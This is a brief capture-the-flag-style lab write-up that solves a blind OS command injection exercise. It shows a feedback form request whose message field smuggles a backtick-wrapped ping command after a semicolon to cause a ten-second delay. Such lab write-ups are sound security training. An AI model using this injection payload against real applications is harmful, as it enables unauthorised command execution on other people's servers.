# Lab: Blind OS command injection with time delays

>This lab contains a blind OS command injection vulnerability in the feedback function.

>The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

>To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

### Vulnerable area
`POST /feedback/submit`

### Time delay
Time delay can be executed with the `ping` command which sends 1 ping per sec... `ping -c 10 127.0.0.1` will send 10 pings over 10 secs to localhost

### Exploit
I modified the above request body to

<pre>csrf=wpdhAPnxLAFU5f4ZjfhjXw1t5lb8g9LS&name=niko&email=niko%40mail.com&subject=mad&message=masd;`ping -c 10 127.0.0.1`</pre>

Used command separator `;` and surrounded the ping command with backticks. I did this because we are executing the ping command *within* the command passed to the server (containing feedback info)

Lab solved!